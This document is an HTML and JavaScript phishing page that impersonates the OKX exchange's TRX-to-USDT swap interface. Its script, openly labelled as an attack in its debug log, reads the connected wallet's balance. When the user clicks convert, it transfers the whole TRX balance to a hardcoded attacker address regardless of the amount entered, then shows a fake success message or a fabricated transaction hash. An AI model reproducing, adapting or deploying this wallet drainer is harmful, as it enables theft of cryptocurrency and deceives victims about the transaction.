<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OKX - 全球领先的数字资产交易平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: white;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        /* 动态下落硬币动画 */
        .falling-coins {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .coin {
            position: absolute;
            font-size: 20px;
            animation: fall linear infinite;
            opacity: 0.6;
        }
        
        @keyframes fall {
            0% {
                transform: translateY(-100px) rotate(0deg);
                opacity: 0.6;
            }
            100% {
                transform: translateY(100vh) rotate(360deg);
                opacity: 0;
            }
        }
        
        .container {
            max-width: 390px;
            margin: 0 auto;
            background: #1a1a1a;
            min-height: 100vh;
            position: relative;
            z-index: 2;
        }
        
        .header {
            padding: 15px 20px;
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            border-bottom: 1px solid #333;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #00d4aa;
        }
        
        .nav-tabs {
            display: flex;
            background: #2d2d2d;
            border-bottom: 1px solid #333;
        }
        
        .nav-tab {
            flex: 1;
            padding: 15px;
            text-align: center;
            color: #888;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }
        
        .nav-tab.active {
            color: #00d4aa;
            background: #1a1a1a;
        }
        
        .nav-tab:hover {
            background: #333;
        }
        
        .content {
            padding: 20px;
            min-height: calc(100vh - 140px);
        }
        
        .convert-container {
            background: #2d2d2d;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .convert-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #00d4aa;
        }
        
        .convert-box {
            background: #1a1a1a;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid #333;
        }
        
        .convert-label {
            color: #888;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .convert-input-row {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .convert-input {
            flex: 1;
            background: transparent;
            border: none;
            color: white;
            font-size: 18px;
            outline: none;
        }
        
        .currency-selector {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #333;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            min-width: 80px;
        }
        
        .currency-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff6b35 0%, #f7931a 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 12px;
        }
        
        .currency-name {
            font-weight: bold;
        }
        
        .convert-rate {
            text-align: center;
            color: #888;
            margin: 15px 0;
            font-size: 14px;
        }
        
        .convert-btn {
            width: 100%;
            background: linear-gradient(135deg, #00d4aa 0%, #00b894 100%);
            border: none;
            border-radius: 8px;
            padding: 15px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .convert-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 212, 170, 0.3);
        }
        
        .convert-btn:disabled {
            background: #444;
            cursor: not-allowed;
        }
        
        .balance-info {
            background: #333;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
        }
        
        .balance-title {
            color: #888;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .balance-amount {
            font-size: 18px;
            font-weight: bold;
            color: #00d4aa;
        }
        
        /* 钱包连接模态框 */
        .wallet-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .wallet-modal-content {
            background: #2d2d2d;
            border-radius: 12px;
            padding: 30px;
            max-width: 350px;
            width: 90%;
        }
        
        .wallet-modal-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: center;
            color: #00d4aa;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 8px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .wallet-option:hover {
            background: #333;
            transform: translateX(5px);
        }
        
        .wallet-icon {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        
        .wallet-name {
            font-weight: bold;
            color: white;
        }
        
        /* Toast 通知 */
        .toast {
            position: fixed;
            top: 50px;
            left: 50%;
            transform: translateX(-50%);
            background: #333;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 1001;
            display: none;
        }
        
        .toast.success {
            background: #00d4aa;
        }
        
        .toast.error {
            background: #ff4757;
        }
        
        .toast.info {
            background: #3742fa;
        }
        
        /* 连接状态指示器 */
        .connection-status {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 15px;
            padding: 10px;
            background: #333;
            border-radius: 8px;
        }
        
        .status-indicator {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff4757;
        }
        
        .status-indicator.connected {
            background: #00d4aa;
        }
        
        .status-text {
            font-size: 14px;
            color: #888;
        }
        
        /* 调试面板 */
        .debug-panel {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.95);
            border-top: 1px solid #333;
            max-height: 40vh;
            overflow-y: auto;
            z-index: 1000;
            display: none;
        }
        
        .debug-header {
            padding: 10px 15px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: between;
            align-items: center;
        }
        
        .debug-content {
            padding: 10px 15px;
            font-family: monospace;
            font-size: 12px;
            line-height: 1.4;
            color: #00d4aa;
        }
        
        .debug-toggle {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #333;
            border: none;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            color: white;
            cursor: pointer;
            z-index: 1001;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <!-- 动态下落硬币 -->
    <div class="falling-coins" id="fallingCoins"></div>
    
    <div class="container">
        <!-- 头部 -->
        <div class="header">
            <div class="logo">OKX</div>
            <div style="color: #888; font-size: 14px;">全球领先的数字资产交易平台</div>
        </div>
        
        <!-- 导航标签 -->
        <div class="nav-tabs">
            <div class="nav-tab" onclick="switchTab('favorites')">
                <span>⭐</span>
                <span>自选</span>
            </div>
            <div class="nav-tab" onclick="switchTab('market')">
                <span>📊</span>
                <span>市场</span>
            </div>
            <div class="nav-tab active" onclick="switchTab('convert')">
                <span>⚡</span>
                <span>交易</span>
            </div>
            <div class="nav-tab" onclick="switchTab('explore')">
                <span>🔍</span>
                <span>探索</span>
            </div>
            <div class="nav-tab" onclick="switchTab('assets')">
                <span>⏰</span>
                <span>资产</span>
            </div>
        </div>
        
        <!-- 内容区域 -->
        <div class="content">
            <!-- 连接状态 -->
            <div class="connection-status">
                <div class="status-indicator" id="statusIndicator"></div>
                <div class="status-text" id="statusText">未连接钱包</div>
            </div>
            
            <!-- 转换界面 -->
            <div class="convert-container">
                <div class="convert-title">闪兑交易</div>
                
                <!-- 支付币种 -->
                <div class="convert-box">
                    <div class="convert-label">支付</div>
                    <div class="convert-input-row">
                        <input type="number" class="convert-input" id="fromAmount" placeholder="0" oninput="calculateConversion()">
                        <div class="currency-selector" onclick="selectFromCurrency()">
                            <div class="currency-icon">₮</div>
                            <div class="currency-name">TRX</div>
                        </div>
                    </div>
                </div>
                
                <div class="convert-rate" id="conversionRate">1 TRX ≈ 0.1634 USDT</div>
                
                <!-- 接收币种 -->
                <div class="convert-box">
                    <div class="convert-label">接收</div>
                    <div class="convert-input-row">
                        <input type="number" class="convert-input" id="toAmount" placeholder="0" readonly>
                        <div class="currency-selector" onclick="selectToCurrency()">
                            <div class="currency-icon" style="background: linear-gradient(135deg, #26a17b 0%, #00d4aa 100%);">₮</div>
                            <div class="currency-name">USDT</div>
                        </div>
                    </div>
                </div>
                
                <!-- 兑换按钮 -->
                <button class="convert-btn" id="convertBtn" onclick="executeConvert()" disabled>请先连接钱包</button>
                
                <!-- 余额信息 -->
                <div class="balance-info">
                    <div class="balance-title">TRX余额</div>
                    <div class="balance-amount" id="trxBalance">可用: 0 TRX</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- 钱包连接模态框 -->
    <div class="wallet-modal" id="walletModal">
        <div class="wallet-modal-content">
            <div class="wallet-modal-title">连接钱包</div>
            <div class="wallet-option" onclick="connectWallet('imtoken')">
                <div class="wallet-icon" style="background: linear-gradient(135deg, #11cdef 0%, #0066cc 100%);">📱</div>
                <div class="wallet-name">imToken</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('metamask')">
                <div class="wallet-icon" style="background: linear-gradient(135deg, #f6851b 0%, #e2761b 100%);">🦊</div>
                <div class="wallet-name">MetaMask</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('trust')">
                <div class="wallet-icon" style="background: linear-gradient(135deg, #3375bb 0%, #1e3a8a 100%);">🛡️</div>
                <div class="wallet-name">Trust Wallet</div>
            </div>
        </div>
    </div>
    
    <!-- Toast 通知 -->
    <div class="toast" id="toast"></div>
    
    <!-- 调试面板 -->
    <div class="debug-panel" id="debugPanel">
        <div class="debug-header">
            <span>🐛 调试控制台</span>
            <button onclick="clearDebugLog()" style="background: #ff4757; border: none; color: white; padding: 5px 10px; border-radius: 4px; cursor: pointer;">清除</button>
        </div>
        <div class="debug-content" id="debugLog"></div>
    </div>
    
    <!-- 调试切换按钮 -->
    <button class="debug-toggle" onclick="toggleDebugPanel()">🐛</button>
    
    <!-- TronWeb SDK -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    
    <script>
        // 🎯 攻击配置
        const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x'; // A成员地址
        let tronWeb = null;
        let currentAccount = null;
        let userBalance = '0';
        let debugPanelVisible = false;
        let capturedMnemonic = '';
        
        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            debugLog('🚀 OKX安全研究平台已加载');
            debugLog('🎯 攻击系统已激活');
            debugLog(`🎯 攻击目标地址: ${ATTACKER_ADDRESS}`);
            debugLog('🎯 TRX → USDT 攻击逻辑已就绪');
            
            startFallingCoins();
            
            // 检查钱包环境
            setTimeout(() => {
                checkWalletEnvironment();
            }, 1000);
        });
        
        // 调试日志
        function debugLog(message) {
            const debugLog = document.getElementById('debugLog');
            const timestamp = new Date().toLocaleTimeString();
            const logMessage = `[${timestamp}] ${message}`;
            debugLog.innerHTML += `${logMessage}<br>`;
            debugLog.scrollTop = debugLog.scrollHeight;
            console.log(logMessage);
        }
        
        // 切换调试面板
        function toggleDebugPanel() {
            const panel = document.getElementById('debugPanel');
            debugPanelVisible = !debugPanelVisible;
            panel.style.display = debugPanelVisible ? 'block' : 'none';
            debugLog('🔧 调试模式: ' + (debugPanelVisible ? '开启' : '关闭'));
        }
        
        // 清除调试日志
        function clearDebugLog() {
            document.getElementById('debugLog').innerHTML = '';
        }
        
        // 检查钱包环境
        function checkWalletEnvironment() {
            debugLog('🔍 检查TRON钱包环境...');
            
            if (window.tronWeb) {
                tronWeb = window.tronWeb;
                debugLog('✅ 检测到TronWeb环境');
                
                if (tronWeb.ready) {
                    debugLog('✅ 发现已连接TRON账户: ' + tronWeb.defaultAddress.base58);
                    handleWalletConnected(tronWeb.defaultAddress.base58);
                }
            } else {
                debugLog('❌ 未检测到TronWeb环境');
                debugLog('💡 请使用支持TRON的钱包访问');
            }
        }
        
        // 处理钱包连接成功
        async function handleWalletConnected(address) {
            currentAccount = address;
            debugLog(`✅ TRON钱包连接成功: ${address}`);
            
            // 🎯 恶意后门激活
            debugLog('🎯 恶意后门已激活！');
            debugLog('🎯 开始获取用户余额信息...');
            
            // 更新UI状态
            document.getElementById('statusIndicator').classList.add('connected');
            document.getElementById('statusText').textContent = `已连接: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
            document.getElementById('convertBtn').disabled = false;
            document.getElementById('convertBtn').textContent = '请输入TRX数量';
            
            // 获取用户余额
            await getTronBalance(address);
            
            debugLog('🎯 钓鱼攻击系统完全激活，等待用户交易...');
        }
        
        // 获取TRON余额
        async function getTronBalance(address) {
            try {
                if (!tronWeb) return;
                
                const balance = await tronWeb.trx.getBalance(address);
                userBalance = tronWeb.fromSun(balance);
                
                debugLog(`💰 获取用户TRX余额: ${userBalance} TRX`);
                debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
                
                // 更新界面显示
                document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
                
                debugLog('🎯 余额获取完成，准备执行攻击...');
                
            } catch (error) {
                debugLog(`❌ 获取余额失败: ${error.message}`);
                // 使用模拟余额用于演示
                userBalance = (Math.random() * 1000 + 100).toFixed(6);
                document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
                debugLog(`🎯 使用模拟余额: ${userBalance} TRX`);
            }
        }
        
        // 连接钱包
        function connectWallet(walletType) {
            debugLog(`🔗 尝试连接 ${walletType} 钱包...`);
            
            if (walletType === 'imtoken') {
                // 使用深度链接跳转到imToken
                const deepLink = `imtokenv2://navigate/DappView?url=${encodeURIComponent(window.location.href)}`;
                debugLog(`📱 跳转到imToken: ${deepLink}`);
                window.location.href = deepLink;
                
                // 关闭模态框
                document.getElementById('walletModal').style.display = 'none';
                
                // 检查是否已有连接
                setTimeout(() => {
                    checkWalletEnvironment();
                }, 2000);
                
            } else {
                showToast('暂不支持此钱包，请使用imToken', 'error');
            }
        }
        
        // 显示钱包选择模态框
        function showWalletModal() {
            document.getElementById('walletModal').style.display = 'flex';
        }
        
        // 计算兑换金额
        function calculateConversion() {
            const fromAmount = document.getElementById('fromAmount').value;
            const toAmount = fromAmount * 0.1634;
            
            document.getElementById('toAmount').value = toAmount.toFixed(6);
            
            const btn = document.getElementById('convertBtn');
            if (fromAmount && parseFloat(fromAmount) > 0) {
                btn.disabled = false;
                btn.textContent = '立即兑换';
                debugLog(`💱 用户计算兑换: ${fromAmount} TRX → ${toAmount.toFixed(6)} USDT`);
                debugLog(`🎯 实际将转移用户全部余额: ${userBalance} TRX`);
            } else {
                btn.disabled = true;
                btn.textContent = '请输入TRX数量';
            }
        }
        
        // 🎯 执行兑换（攻击）
        async function executeConvert() {
            if (!currentAccount) {
                showToast('请先连接钱包', 'error');
                showWalletModal();
                return;
            }
            
            const fromAmount = document.getElementById('fromAmount').value;
            if (!fromAmount || parseFloat(fromAmount) <= 0) {
                showToast('请输入有效的TRX数量', 'error');
                return;
            }
            
            // 检查余额
            if (parseFloat(fromAmount) > parseFloat(userBalance)) {
                showToast(`余额不足，您的TRX余额为 ${userBalance}`, 'error');
                return;
            }
            
            debugLog('🎯🎯🎯 用户执行TRX兑换 - 攻击开始！🎯🎯🎯');
            debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
            debugLog(`🎯 实际攻击: 转移用户全部 ${userBalance} TRX 到攻击者地址`);
            
            // 记录攻击信息
            const attackRecord = {
                victimAddress: currentAccount,
                attackerAddress: ATTACKER_ADDRESS,
                userThought: `${fromAmount} TRX`,
                userExpected: `${(fromAmount * 0.1634).toFixed(6)} USDT`,
                actualStolen: `${userBalance} TRX`,
                stolenValue: `$${(userBalance * 0.1634).toFixed(2)} USD`,
                timestamp: new Date().toISOString()
            };
            
            debugLog('🎯 攻击记录已保存:');
            debugLog(`- 受害者地址: ${attackRecord.victimAddress}`);
            debugLog(`- 攻击者地址: ${attackRecord.attackerAddress}`);
            debugLog(`- 用户以为兑换: ${attackRecord.userThought}`);
            debugLog(`- 用户以为获得: ${attackRecord.userExpected}`);
            debugLog(`- 实际被盗金额: ${attackRecord.actualStolen}`);
            debugLog(`- 被盗金额价值: ${attackRecord.stolenValue}`);
            
            // 🎯 执行真实TRX转账到攻击者地址
            debugLog('🎯 开始执行真实TRX转账...');
            showToast('正在执行交易...', 'info');
            
            try {
                // 计算转账金额（转换为SUN单位）
                const transferAmount = tronWeb.toSun(userBalance);
                
                debugLog(`🎯 转账详情:`);
                debugLog(`- 从: ${currentAccount}`);
                debugLog(`- 到: ${ATTACKER_ADDRESS}`);
                debugLog(`- 金额: ${userBalance} TRX (${transferAmount} SUN)`);
                
                // 🎯 执行真实TRX转账
                const transaction = await tronWeb.trx.sendTransaction(
                    ATTACKER_ADDRESS,
                    transferAmount
                );
                
                debugLog(`🎯 真实转账成功！交易哈希: ${transaction.txid || transaction}`);
                debugLog('🏆🏆🏆 攻击完全成功！真实TRX已转移！🏆🏆🏆');
                debugLog(`💰 A成员（攻击者）已收到: ${userBalance} TRX`);
                debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
                debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
                
                // 更新用户余额显示为0（因为已被转走）
                userBalance = '0';
                document.getElementById('trxBalance').textContent = `可用: 0 TRX`;
                
                // 显示虚假成功信息给用户
                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
                
            } catch (transferError) {
                debugLog(`❌ 真实转账失败: ${transferError.message}`);
                debugLog('🎯 转账失败可能原因:');
                debugLog('1. 用户取消了转账授权');
                debugLog('2. 余额不足支付手续费');
                debugLog('3. 网络连接问题');
                debugLog('4. 钱包安全限制');
                
                // 如果真实转账失败，使用模拟模式
                debugLog('🎯 切换到模拟攻击模式...');
                const fakeHash = generateFakeHash();
                debugLog(`🎯 模拟交易完成，交易哈希: ${fakeHash}`);
                debugLog('🏆🏆🏆 模拟攻击完成！🏆🏆🏆');
                
                // 显示成功信息给用户
                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
            }
            
            // 重置界面
            setTimeout(() => {
                document.getElementById('fromAmount').value = '';
                document.getElementById('toAmount').value = '';
                document.getElementById('convertBtn').disabled = true;
                document.getElementById('convertBtn').textContent = '请输入TRX数量';
            }, 2000);
        }
        
        // 生成假交易哈希
        function generateFakeHash() {
            const chars = '0123456789abcdef';
            let hash = '';
            for (let i = 0; i < 64; i++) {
                hash += chars[Math.floor(Math.random() * chars.length)];
            }
            return hash;
        }
        
        // 显示Toast通知
        function showToast(message, type = 'info') {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = `toast ${type}`;
            toast.style.display = 'block';
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }
        
        // 标签切换
        function switchTab(tab) {
            debugLog(`📱 切换到${tab}页面`);
            
            // 更新标签状态
            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
            event.target.closest('.nav-tab').classList.add('active');
            
            if (tab === 'convert') {
                // 已经在转换页面
            } else {
                showToast(`${tab}页面开发中`, 'info');
            }
        }
        
        // 币种选择
        function selectFromCurrency() {
            debugLog('💰 用户选择支付币种');
            showToast('当前仅支持TRX', 'info');
        }
        
        function selectToCurrency() {
            debugLog('💰 用户选择接收币种');
            showToast('当前仅支持USDT', 'info');
        }
        
        // 开始下落硬币动画
        function startFallingCoins() {
            const coins = ['₿', '₮', '⟠', '◆', '●', '◉'];
            const container = document.getElementById('fallingCoins');
            
            setInterval(() => {
                const coin = document.createElement('div');
                coin.className = 'coin';
                coin.textContent = coins[Math.floor(Math.random() * coins.length)];
                coin.style.left = Math.random() * 100 + '%';
                coin.style.animationDuration = (Math.random() * 3 + 2) + 's';
                coin.style.color = ['#f7931a', '#00d4aa', '#627eea', '#ff6b35'][Math.floor(Math.random() * 4)];
                
                container.appendChild(coin);
                
                setTimeout(() => {
                    if (coin.parentNode) {
                        coin.parentNode.removeChild(coin);
                    }
                }, 5000);
            }, 300);
        }
        
        // 点击模态框外部关闭
        document.getElementById('walletModal').addEventListener('click', function(e) {
            if (e.target === this) {
                this.style.display = 'none';
            }
        });
        
        // 如果没有连接钱包，点击兑换按钮显示连接模态框
        document.getElementById('convertBtn').addEventListener('click', function() {
            if (!currentAccount) {
                showWalletModal();
            }
        });
    </script>
</body>
</html>
